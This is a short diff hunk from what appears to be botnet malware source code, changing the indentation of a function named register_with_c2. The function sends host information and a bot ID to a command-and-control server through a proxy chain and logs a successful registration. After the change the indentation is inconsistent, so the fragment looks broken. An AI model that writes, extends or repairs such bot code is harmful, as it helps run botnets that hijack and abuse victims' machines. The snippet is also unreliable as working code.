@@ -660,7 +660,7 @@ def register_with_c2(ghost_comm_client):
                     payload = {'type': 'register', 'info': info, 'id': BOT_ID} # Add bot_id to payload
                     response = ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
                     response_data = json.loads(response.decode('utf-8'))
-        if response_data.get('status') == 'ok':
+                    if response_data.get('status') == 'ok':
             logger.info("Successfully registered with C2 server.")
             return response_data.get('bot_id')
         else:
